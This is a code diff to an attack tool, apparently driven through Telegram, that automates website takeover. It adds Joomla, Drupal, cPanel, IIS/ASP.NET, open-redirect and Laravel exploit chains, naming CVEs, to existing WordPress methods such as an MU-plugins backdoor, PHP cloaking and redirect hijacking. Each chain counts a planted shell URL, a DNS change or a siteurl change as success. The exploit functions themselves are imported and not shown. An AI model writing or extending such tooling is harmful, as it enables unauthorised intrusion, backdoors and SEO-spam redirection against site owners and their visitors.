@@ -3816,6 +3816,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         keywords: string[]; // keywords to match from attackVector name/technique
       };
       const ALL_METHODS: AttackMethodDef[] = [
+        // WP-specific methods
         { id: "pipeline", name: "Unified Attack Pipeline", phase: "exploit", icon: "💥", keywords: ["upload", "put", "post", "webdav", "writable", "form", "multipart"] },
         { id: "cloaking", name: "PHP Cloaking Injection", phase: "inject", icon: "💊", keywords: ["cloaking", "php", "inject", "htaccess", "functions.php"] },
         { id: "mu_plugins", name: "MU-Plugins Backdoor", phase: "inject", icon: "💀", keywords: ["mu-plugin", "must-use", "auto-load", "mu_plugins", "wp-content/mu"] },
@@ -3825,6 +3826,13 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         { id: "hijack", name: "Hijack Redirect", phase: "hijack", icon: "🔓", keywords: ["credential", "brute", "xmlrpc", "ftp", "mysql", "phpmyadmin", "cpanel", "takeover"] },
         { id: "advanced", name: "Advanced Deploy (5 เทคนิค)", phase: "exploit", icon: "🚀", keywords: ["parasite", "doorway", "play store", "apk", "seo"] },
         { id: "redirect", name: "Redirect Takeover ตรง", phase: "hijack", icon: "🎯", keywords: ["redirect", "301", "302", "meta refresh", "javascript redirect"] },
+        // Non-WP CMS methods
+        { id: "joomla", name: "Joomla Exploits", phase: "exploit", icon: "🔴", keywords: ["joomla", "com_fields", "com_content", "com_users", "joomla template", "joomla api"] },
+        { id: "drupal", name: "Drupal Exploits", phase: "exploit", icon: "🔵", keywords: ["drupal", "drupalgeddon", "drupal theme", "drupal module", "node/1"] },
+        { id: "cpanel_full", name: "cPanel Full Control", phase: "hijack", icon: "🖥️", keywords: ["cpanel", "whm", "file manager", "zone editor", "cron", "cpanel_api", "2083"] },
+        { id: "iis_aspnet", name: "IIS/ASP.NET Exploits", phase: "exploit", icon: "🪟", keywords: ["iis", "asp.net", "aspx", "web.config", "windows server", ".aspx"] },
+        { id: "open_redirect", name: "Open Redirect Chain", phase: "hijack", icon: "🔗", keywords: ["open redirect", "redirect_uri", "return_to", "next=", "callback", "goto"] },
+        { id: "laravel_inject", name: "Laravel Redirect Inject", phase: "exploit", icon: "🟥", keywords: ["laravel", "ignition", ".env", "artisan", "blade", "eloquent", "laravel debug"] },
       ];
       
       // Build dynamic order from scan results
@@ -3862,8 +3870,8 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         );
       } else {
         // Fallback: fixed order
-        methodOrder = ["pipeline", "cloaking", "mu_plugins", "db_siteurl", "gtm_inject", "auto_prepend", "hijack", "advanced", "redirect"];
-        await narrator.addAnalysis(`⚠️ ไม่มีข้อมูล scan — ใช้ลำดับเริ่มต้น: Pipeline → Cloaking → MU-Plugins → DB Hijack → GTM → auto_prepend → Hijack → Advanced → Redirect`);
+        methodOrder = ["pipeline", "cloaking", "mu_plugins", "db_siteurl", "gtm_inject", "auto_prepend", "hijack", "advanced", "redirect", "joomla", "drupal", "cpanel_full", "iis_aspnet", "open_redirect", "laravel_inject"];
+        await narrator.addAnalysis(`⚠️ ไม่มีข้อมูล scan — ใช้ลำดับเริ่มต้น: Pipeline → Cloaking → MU-Plugins → DB Hijack → GTM → auto_prepend → Hijack → Advanced → Redirect → Joomla → Drupal → cPanel → IIS → Open Redirect → Laravel`);
       }
       
       // Execute methods in AI-determined order
@@ -4201,6 +4209,162 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             } else {
               failedMethods.push(`Redirect (0/${rtResults.length})`);
               await narrator.addAnalysis(`❌ Redirect Takeover ล้มเหลวทั้งหมด`);
+            }
+          } else if (methodId === "joomla") {
+            // ── Joomla Exploits ──
+            await narrator.addStep("🔴 Joomla API Disclosure (CVE-2023-23752)");
+            const { joomlaApiDisclosure, joomlaTemplateInject, joomlaComFieldsSqli } = await import("./non-wp-exploits");
+            const joomlaConfig: any = { targetUrl: `https://${domain}`, redirectUrl, cms: "joomla", discoveredCredentials: [] as any[] };
+            
+            const apiResult = await joomlaApiDisclosure(joomlaConfig);
+            await narrator.completeLastStep(apiResult.success ? "done" : "failed");
+            if (apiResult.success) {
+              // If we got creds from API disclosure, pass them to template inject
+              if (apiResult.details?.includes("credentials")) {
+                const credsMatch = apiResult.details.match(/user:\s*(\S+).*?pass:\s*(\S+)/);
+                if (credsMatch) joomlaConfig.discoveredCredentials = [...joomlaConfig.discoveredCredentials, { username: credsMatch[1], password: credsMatch[2], type: "joomla_admin" }];
+              }
+            }
+            
+            await narrator.addStep("🔴 Joomla Template Inject");
+            const tmplResult = await joomlaTemplateInject(joomlaConfig);
+            await narrator.completeLastStep(tmplResult.success ? "done" : "failed");
+            if (tmplResult.success && tmplResult.shellUrl) {
+              fullChainSuccess = true;
+              successMethod = `Joomla Template Inject (${tmplResult.technique})`;
+              successUrl = tmplResult.shellUrl;
+              await narrator.addAnalysis(`✅ Joomla Template Inject สำเร็จ!`);
+            } else {
+              await narrator.addStep("🔴 Joomla com_fields SQLi");
+              const sqliResult = await joomlaComFieldsSqli(joomlaConfig);
+              await narrator.completeLastStep(sqliResult.success ? "done" : "failed");
+              if (sqliResult.success && sqliResult.shellUrl) {
+                fullChainSuccess = true;
+                successMethod = `Joomla SQLi (${sqliResult.technique})`;
+                successUrl = sqliResult.shellUrl;
+                await narrator.addAnalysis(`✅ Joomla SQLi สำเร็จ!`);
+              } else {
+                failedMethods.push(`Joomla (API+Template+SQLi)`);
+                await narrator.addAnalysis(`❌ Joomla exploits ล้มเหลวทั้งหมด`);
+              }
+            }
+          } else if (methodId === "drupal") {
+            // ── Drupal Exploits ──
+            await narrator.addStep("🔵 Drupalgeddon 2 (CVE-2018-7600)");
+            const { drupalgeddon2, drupalThemeInject } = await import("./non-wp-exploits");
+            const drupalConfig: any = { targetUrl: `https://${domain}`, redirectUrl, cms: "drupal", discoveredCredentials: [] as any[] };
+            
+            const dg2Result = await drupalgeddon2(drupalConfig);
+            await narrator.completeLastStep(dg2Result.success ? "done" : "failed");
+            if (dg2Result.success && dg2Result.shellUrl) {
+              fullChainSuccess = true;
+              successMethod = `Drupalgeddon 2 (${dg2Result.technique})`;
+              successUrl = dg2Result.shellUrl;
+              await narrator.addAnalysis(`✅ Drupalgeddon 2 สำเร็จ!`);
+            } else {
+              await narrator.addStep("🔵 Drupal Theme Inject");
+              const themeResult = await drupalThemeInject(drupalConfig);
+              await narrator.completeLastStep(themeResult.success ? "done" : "failed");
+              if (themeResult.success && themeResult.shellUrl) {
+                fullChainSuccess = true;
+                successMethod = `Drupal Theme Inject (${themeResult.technique})`;
+                successUrl = themeResult.shellUrl;
+                await narrator.addAnalysis(`✅ Drupal Theme Inject สำเร็จ!`);
+              } else {
+                failedMethods.push(`Drupal (Drupalgeddon2+Theme)`);
+                await narrator.addAnalysis(`❌ Drupal exploits ล้มเหลวทั้งหมด`);
+              }
+            }
+          } else if (methodId === "cpanel_full") {
+            // ── cPanel Full Control ──
+            await narrator.addStep("🖥️ cPanel File Manager API");
+            const { cpanelFileManager, cpanelMysqlApi, cpanelZoneEditor } = await import("./non-wp-exploits");
+            const cpConfig: any = { targetUrl: `https://${domain}`, redirectUrl, cms: vulnScanResult?.cms?.type || "unknown", discoveredCredentials: [] as any[] };
+            
+            const fmResult = await cpanelFileManager(cpConfig);
+            await narrator.completeLastStep(fmResult.success ? "done" : "failed");
+            if (fmResult.success && fmResult.shellUrl) {
+              fullChainSuccess = true;
+              successMethod = `cPanel File Manager (${fmResult.technique})`;
+              successUrl = fmResult.shellUrl;
+              await narrator.addAnalysis(`✅ cPanel File Manager สำเร็จ!`);
+            } else {
+              await narrator.addStep("🖥️ cPanel MySQL API");
+              const mysqlResult = await cpanelMysqlApi(cpConfig);
+              await narrator.completeLastStep(mysqlResult.success ? "done" : "failed");
+              if (mysqlResult.success) {
+                fullChainSuccess = true;
+                successMethod = `cPanel MySQL (${mysqlResult.technique})`;
+                successUrl = `https://${domain}`;
+                await narrator.addAnalysis(`✅ cPanel MySQL API สำเร็จ — siteurl/home ถูกเปลี่ยนแล้ว!`);
+              } else {
+                await narrator.addStep("🖥️ cPanel Zone Editor (DNS)");
+                const dnsResult = await cpanelZoneEditor(cpConfig);
+                await narrator.completeLastStep(dnsResult.success ? "done" : "failed");
+                if (dnsResult.success) {
+                  fullChainSuccess = true;
+                  successMethod = `cPanel DNS Hijack (${dnsResult.technique})`;
+                  successUrl = `https://${domain}`;
+                  await narrator.addAnalysis(`✅ cPanel Zone Editor สำเร็จ — DNS ถูกเปลี่ยนแล้ว!`);
+                } else {
+                  failedMethods.push(`cPanel (FileManager+MySQL+DNS)`);
+                  await narrator.addAnalysis(`❌ cPanel exploits ล้มเหลวทั้งหมด`);
+                }
+              }
+            }
+          } else if (methodId === "iis_aspnet") {
+            // ── IIS/ASP.NET Exploits ──
+            await narrator.addStep("🪟 web.config Inject + ASPX Upload");
+            const { webConfigInject, iisShortnameScan } = await import("./non-wp-exploits");
+            const iisConfig: any = { targetUrl: `https://${domain}`, redirectUrl, cms: "iis", discoveredCredentials: [] as any[] };
+            
+            const wcResult = await webConfigInject(iisConfig);
+            await narrator.completeLastStep(wcResult.success ? "done" : "failed");
+            if (wcResult.success && wcResult.shellUrl) {
+              fullChainSuccess = true;
+              successMethod = `IIS web.config (${wcResult.technique})`;
+              successUrl = wcResult.shellUrl;
+              await narrator.addAnalysis(`✅ IIS web.config/ASPX inject สำเร็จ!`);
+            } else {
+              await narrator.addStep("🪟 IIS Shortname Scan");
+              const snResult = await iisShortnameScan(iisConfig);
+              await narrator.completeLastStep(snResult.success ? "done" : "failed");
+              failedMethods.push(`IIS (web.config+ASPX)`);
+              await narrator.addAnalysis(`❌ IIS exploits ล้มเหลว${snResult.success ? " (แต่พบ shortname enumeration)" : ""}`);
+            }
+          } else if (methodId === "open_redirect") {
+            // ── Open Redirect Chain ──
+            await narrator.addStep("🔗 สแกนหา Open Redirect endpoints");
+            const { openRedirectChain } = await import("./non-wp-exploits");
+            const orConfig: any = { targetUrl: `https://${domain}`, redirectUrl, cms: vulnScanResult?.cms?.type || "unknown" };
+            
+            const orResult = await openRedirectChain(orConfig);
+            await narrator.completeLastStep(orResult.success ? "done" : "failed");
+            if (orResult.success && orResult.shellUrl) {
+              fullChainSuccess = true;
+              successMethod = `Open Redirect (${orResult.technique})`;
+              successUrl = orResult.shellUrl;
+              await narrator.addAnalysis(`✅ Open Redirect Chain สำเร็จ! ${orResult.details}`);
+            } else {
+              failedMethods.push(`Open Redirect`);
+              await narrator.addAnalysis(`❌ ไม่พบ Open Redirect endpoints`);
+            }
+          } else if (methodId === "laravel_inject") {
+            // ── Laravel Redirect Inject ──
+            await narrator.addStep("🟥 Laravel .env + Ignition RCE");
+            const { laravelRedirectInject } = await import("./non-wp-exploits");
+            const laravelConfig: any = { targetUrl: `https://${domain}`, redirectUrl, cms: "laravel", discoveredCredentials: [] as any[] };
+            
+            const lrResult = await laravelRedirectInject(laravelConfig);
+            await narrator.completeLastStep(lrResult.success ? "done" : "failed");
+            if (lrResult.success && lrResult.shellUrl) {
+              fullChainSuccess = true;
+              successMethod = `Laravel Inject (${lrResult.technique})`;
+              successUrl = lrResult.shellUrl;
+              await narrator.addAnalysis(`✅ Laravel Redirect Inject สำเร็จ!`);
+            } else {
+              failedMethods.push(`Laravel`);
+              await narrator.addAnalysis(`❌ Laravel exploits ล้มเหลว`);
             }
           }
         } catch (methodErr: any) {
